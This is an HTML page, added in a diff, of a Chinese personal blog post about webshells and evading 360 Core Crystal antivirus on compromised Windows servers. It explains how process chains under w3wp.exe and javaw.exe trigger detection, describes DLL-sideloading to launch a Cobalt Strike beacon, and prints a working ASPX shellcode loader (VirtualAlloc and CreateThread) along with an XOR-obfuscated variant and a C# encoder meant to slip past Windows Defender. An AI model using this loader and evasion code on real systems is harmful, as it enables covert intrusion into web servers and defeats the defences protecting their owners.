@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-mac-osx.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="概述在webshell上线木马，他的进程链是cmd，若双击木马，它的进程链是explorer.exe 核晶查杀机制当我们在webshell终端执行cmd命令时，不要一上来就whoami，这样很容易会被杀软查杀，从而导致杀软的查杀力度越来越严格，毕竟360核晶是带机器学习引擎的 	    最好先执行tasklist命令列出目标系统的所有进程，看看是否有杀毒软件 		    有时候你执行calc.ex">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chensicha‘s blogs">
+<meta property="og:url" content="http://example.com/2024/04/29/Webshell%E4%B8%93%E9%A2%98/index.html">
+<meta property="og:site_name" content="Chensicha‘s blogs">
+<meta property="og:description" content="概述在webshell上线木马，他的进程链是cmd，若双击木马，它的进程链是explorer.exe 核晶查杀机制当我们在webshell终端执行cmd命令时，不要一上来就whoami，这样很容易会被杀软查杀，从而导致杀软的查杀力度越来越严格，毕竟360核晶是带机器学习引擎的 	    最好先执行tasklist命令列出目标系统的所有进程，看看是否有杀毒软件 		    有时候你执行calc.ex">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/04/29/Webshell%E4%B8%93%E9%A2%98/Webshell%E4%B8%93%E9%A2%98/image-20230706100519333.png">
+<meta property="og:image" content="http://example.com/2024/04/29/Webshell%E4%B8%93%E9%A2%98/Webshell%E4%B8%93%E9%A2%98/image-20230707210931111.png">
+<meta property="og:image" content="http://example.com/Webshell%E4%B8%93%E9%A2%98/image-20230706102328691.png">
+<meta property="og:image" content="http://example.com/2024/04/29/Webshell%E4%B8%93%E9%A2%98/Webshell%E4%B8%93%E9%A2%98/image-20230706104523446.png">
+<meta property="og:image" content="http://example.com/2024/04/29/Webshell%E4%B8%93%E9%A2%98/Webshell%E4%B8%93%E9%A2%98/image-20230706104945850.png">
+<meta property="og:image" content="http://example.com/Webshell%E4%B8%93%E9%A2%98/image-20230707212917711.png">
+<meta property="og:image" content="http://example.com/Webshell%E4%B8%93%E9%A2%98/image-20230707213404445.png">
+<meta property="og:image" content="http://example.com/2024/04/29/Webshell%E4%B8%93%E9%A2%98/Webshell%E4%B8%93%E9%A2%98/image-20230707120718329.png">
+<meta property="og:image" content="http://example.com/Webshell%E4%B8%93%E9%A2%98/image-20230707121418517.png">
+<meta property="og:image" content="http://example.com/2024/04/29/Webshell%E4%B8%93%E9%A2%98/Webshell%E4%B8%93%E9%A2%98/image-20230707221833150.png">
+<meta property="og:image" content="http://example.com/2024/04/29/Webshell%E4%B8%93%E9%A2%98/Webshell%E4%B8%93%E9%A2%98/image-20230707130455544.png">
+<meta property="og:image" content="http://example.com/Webshell%E4%B8%93%E9%A2%98/image-20230707223429319.png">
+<meta property="og:image" content="http://example.com/Webshell%E4%B8%93%E9%A2%98/image-20230711120654971.png">
+<meta property="og:image" content="http://example.com/Webshell%E4%B8%93%E9%A2%98/image-20230711120828955.png">
+<meta property="og:image" content="http://example.com/Webshell%E4%B8%93%E9%A2%98/image-20230711162006664.png">
+<meta property="og:image" content="http://example.com/Webshell%E4%B8%93%E9%A2%98/image-20230711161922059.png">
+<meta property="article:published_time" content="2024-04-29T07:43:25.481Z">
+<meta property="article:modified_time" content="2023-08-26T09:09:52.000Z">
+<meta property="article:author" content="Xiao Ni">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/04/29/Webshell%E4%B8%93%E9%A2%98/Webshell%E4%B8%93%E9%A2%98/image-20230706100519333.png">
+
+<link rel="canonical" href="http://example.com/2024/04/29/Webshell%E4%B8%93%E9%A2%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | Chensicha‘s blogs</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Chensicha‘s blogs</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-留言">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/Webshell%E4%B8%93%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
+      <meta itemprop="name" content="Xiao Ni">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chensicha‘s blogs">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在webshell上线木马，他的进程链是cmd，若双击木马，它的进程链是explorer.exe</p>
+<h1 id="核晶查杀机制"><a href="#核晶查杀机制" class="headerlink" title="核晶查杀机制"></a>核晶查杀机制</h1><p>当我们在webshell终端执行cmd命令时，不要一上来就<code>whoami</code>，这样很容易会被杀软查杀，从而导致杀软的查杀力度越来越严格，毕竟360核晶是带机器学习引擎的</p>
+<img src="Webshell专题/image-20230706100519333.png" alt="image-20230706100519333" style="zoom:67%;" />	
+
+
+
+<p>最好先执行tasklist命令列出目标系统的所有进程，看看是否有杀毒软件</p>
+<img src="Webshell专题/image-20230707210931111.png" alt="image-20230707210931111" style="zoom:67%;" />		
+
+
+
+<p>有时候你执行calc.exe命令也会被核晶捕捉到，讲道理calc命令就是一个正常的命令，那么为什么会报毒呢？我觉得这可能是一开始你的一些操作被杀软捕捉到了，例如上述我说的执行whoami命令，一旦杀软的查杀力度上来了，你后面起的任何进程都会被查杀</p>
+<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230706102328691.png" alt="image-20230706102328691">	</p>
+<p>360核晶查杀还涉及到进程链问题，当我们在webshell终端执行notepad.exe命令时，它的cmd进程是起在w3wp.exe进程下</p>
+<blockquote>
+<p><code>w3wp.exe</code> 是 Windows Web 服务器 (IIS) 中的 Worker Process（工作进程）。在你的 web 应用程序接收到一个请求时，该请求实际上是由一个或多个这样的进程来处理的</p>
+</blockquote>
+<img src="Webshell专题/image-20230706104523446.png" alt="image-20230706104523446" style="zoom:67%;" />	
+
+
+
+<p>如果在虚拟机中直接打开cmd执行notepad.exe，可以发现cmd进程是起在explorer进程下，这种方式起的进程是不会被杀软查杀的</p>
+<img src="Webshell专题/image-20230706104945850.png" alt="image-20230706104945850" style="zoom:67%;" />	
+
+
+
+<p>我将白+黑程序上传至目标主机，随后在目标主机中点击白程序，CS能够成功上线</p>
+<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230707212917711.png" alt="image-20230707212917711"></p>
+<p>但是在webshell的cmd终端执行白程序会被查杀，就连你劫持的哪个dll都会被杀软捕捉到</p>
+<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230707213404445.png" alt="image-20230707213404445">		</p>
+<h1 id="bypass核晶思路"><a href="#bypass核晶思路" class="headerlink" title="bypass核晶思路"></a>bypass核晶思路</h1><h2 id="1-aspx马加载shellcode"><a href="#1-aspx马加载shellcode" class="headerlink" title="1.aspx马加载shellcode"></a>1.aspx马加载shellcode</h2><h3 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h3><p>以下是aspx文件的代码，主要使用C#编写，导入了<code>System</code>和<code>System.Runtime.InteropServices</code>命名空间。</p>
+<p>然后，它声明了两个P&#x2F;Invoke方法，这些方法是.NET中用于调用Windows API或者其他非.NET DLL的方法。这两个方法是<code>VirtualAlloc</code>和<code>CreateThread</code>，它们来自<code>kernel32.dll</code>，一个是Windows系统的核心库</p>
+<p>接下来是<code>Page_Load</code>方法，这是ASP.NET页面生命周期中的一个重要事件。在页面首次加载和后续的请求中，它都会被触发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System&quot;%&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System.Runtime.InteropServices&quot;%&gt;</span><br><span class="line">&lt;script language=&quot;c#&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">private static extern IntPtr CreateThread(uint lpThreadAttributes,uint dwStackSize, IntPtr lpStartAddress,IntPtr param, uint dwCreationFlags, ref uint lpThreadId);</span><br><span class="line"></span><br><span class="line">public void Page_Load(object sender, EventArgs e)&#123;</span><br><span class="line">	byte[] esc = new byte[928] &#123;“填写C#的shellcode”&#125;;</span><br><span class="line">	IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)esc.Length, 0x1000, 0x40);</span><br><span class="line">	Marshal.Copy(esc, 0, funcAddr, esc.Length);</span><br><span class="line">	IntPtr hThread = IntPtr.Zero;</span><br><span class="line">	uint threadId = 0;</span><br><span class="line">	IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">	hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">	Response.Write(&quot;CreateThread: 0x&quot; + hThread.ToString(&quot;x2&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">   return;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在上述代码中，填写C#的shellcode要注意<code>w3wp.exe</code>的架构，w3wp.exe是IIS的工作进程，我们的aspx文件都是通过w3wp.exe来解析的，就如此处的<code>w3wp.exe</code>的架构是x64的，那就需要填写x64的shellcode</p>
+<img src="Webshell专题/image-20230707120718329.png" alt="image-20230707120718329" style="zoom:67%;" />	
+
+
+
+<p>360和火绒都不查杀此文件，但是WindowsDefender会查杀</p>
+<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230707121418517.png" alt="image-20230707121418517">	</p>
+<img src="Webshell专题/image-20230707221833150.png" alt="image-20230707221833150" style="zoom:67%;" />	
+
+
+
+<p>网页访问aspx文件时，cobaltstrike上线成功，并且360核晶也没有拦截</p>
+<img src="Webshell专题/image-20230707130455544.png" alt="image-20230707130455544" style="zoom: 50%;" />	
+
+<p>​				</p>
+<p>在beacon执行<code>getuid</code>命令也不会被拦截，简单总结下，此类技术之所以能躲避杀软的检测，是因为w3wp.exe进程本身是正常存在的，并且经常在正常操作中被使用，这也导致杀软不敢轻易就关掉此进程</p>
+<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230707223429319.png" alt="image-20230707223429319"></p>
+<h3 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h3><p>WindowsDefender会查杀aspx代码里的shellcode, 只需对shellcode进行异或加密就能绕过, 以下是修改后的aspx文件代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System&quot;%&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System.Runtime.InteropServices&quot;%&gt;</span><br><span class="line">&lt;%@ import Namespace=&quot;System.Text&quot;%&gt;</span><br><span class="line">&lt;script language=&quot;c#&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">private static extern IntPtr CreateThread(uint lpThreadAttributes,uint dwStackSize, IntPtr lpStartAddress,IntPtr param, uint dwCreationFlags, ref uint lpThreadId);</span><br><span class="line"></span><br><span class="line">public void Page_Load(object sender, EventArgs e)&#123;</span><br><span class="line">    // 加密后的shellcode</span><br><span class="line">    byte[] esc = new byte[928] &#123; /* 省略 */ &#125;;</span><br><span class="line">    </span><br><span class="line">    // 解密密钥</span><br><span class="line">    byte[] key = System.Text.Encoding.UTF8.GetBytes(&quot;henry666&quot;);</span><br><span class="line"></span><br><span class="line">    // 解密shellcode</span><br><span class="line">    for (int i = 0; i &lt; esc.Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        esc[i] ^= key[i % key.Length];</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)esc.Length, 0x1000, 0x40);</span><br><span class="line">    Marshal.Copy(esc, 0, funcAddr, esc.Length);</span><br><span class="line">    IntPtr hThread = IntPtr.Zero;</span><br><span class="line">    uint threadId = 0;</span><br><span class="line">    IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">    Response.Write(&quot;CreateThread: 0x&quot; + hThread.ToString(&quot;x2&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">   return;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>以下是xor加密shellcode的C#代码</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 原始shellcode</span></span><br><span class="line">        <span class="built_in">byte</span>[] shellcode = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">928</span>] &#123;&#125;;</span><br><span class="line">            </span><br><span class="line">        <span class="comment">// 加密密钥</span></span><br><span class="line">        <span class="built_in">byte</span>[] key = Encoding.UTF8.GetBytes(<span class="string">&quot;henry666&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加密shellcode</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; shellcode.Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            shellcode[i] ^= key[i % key.Length];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印加密后的shellcode</span></span><br><span class="line">        Console.Write(<span class="string">&quot;byte[] shellcode = new byte[&#123;0&#125;] &#123;&#123;&quot;</span>, shellcode.Length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; shellcode.Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.Write(<span class="string">&quot;0x&#123;0&#125;&quot;</span>, shellcode[i].ToString(<span class="string">&quot;X2&quot;</span>));</span><br><span class="line">            <span class="keyword">if</span> (i != shellcode.Length - <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.Write(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Console.Write(<span class="string">&quot;&#125;;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等待用户按下回车键</span></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;\n\nPress Enter to exit...&quot;</span>);</span><br><span class="line">        Console.ReadLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-jsp马研究"><a href="#2-jsp马研究" class="headerlink" title="2.jsp马研究"></a>2.jsp马研究</h2><p>webshell终端执行<code>tasklist</code>命令没有出现报毒</p>
+<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230711120654971.png" alt="image-20230711120654971"></p>
+<p>执行whoami也没有报毒，为啥asp的马会报毒呢？会不会是冰鞋</p>
+<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230711120828955.png" alt="image-20230711120828955">	</p>
+<p>运行白+黑时被杀软查杀了，查看进程链可以得知，cmd进程是起在javaw.exe下</p>
+<blockquote>
+<p><code>javaw.exe</code> 提供了一个运行环境，用于运行解析和执行 JSP 文件的 Servlet 容器</p>
+</blockquote>
+<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230711162006664.png" alt="image-20230711162006664">			</p>
+<p><img src="/Webshell%E4%B8%93%E9%A2%98/image-20230711161922059.png" alt="image-20230711161922059"></p>
+<h2 id="3-php马"><a href="#3-php马" class="headerlink" title="3.php马"></a>3.php马</h2><p>​			</p>
+<h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>​	</p>
+<p>​	</p>
+<p>​			</p>
+<p>​		</p>
+<p>​	</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/04/29/WeakDefender/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/04/29/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%B8%E6%99%B6%E6%9F%A5%E6%9D%80%E6%9C%BA%E5%88%B6"><span class="nav-number">2.</span> <span class="nav-text">核晶查杀机制</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bypass%E6%A0%B8%E6%99%B6%E6%80%9D%E8%B7%AF"><span class="nav-number">3.</span> <span class="nav-text">bypass核晶思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-aspx%E9%A9%AC%E5%8A%A0%E8%BD%BDshellcode"><span class="nav-number">3.1.</span> <span class="nav-text">1.aspx马加载shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E6%BC%94%E7%A4%BA"><span class="nav-number">3.1.1.</span> <span class="nav-text">实战演示</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%8D%E6%9D%80%E5%A4%84%E7%90%86"><span class="nav-number">3.1.2.</span> <span class="nav-text">免杀处理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-jsp%E9%A9%AC%E7%A0%94%E7%A9%B6"><span class="nav-number">3.2.</span> <span class="nav-text">2.jsp马研究</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-php%E9%A9%AC"><span class="nav-number">3.3.</span> <span class="nav-text">3.php马</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#End"><span class="nav-number">4.</span> <span class="nav-text">End</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xiao Ni"
+      src="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
+  <p class="site-author-name" itemprop="name">Xiao Ni</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xiao Ni</span>
+</div>
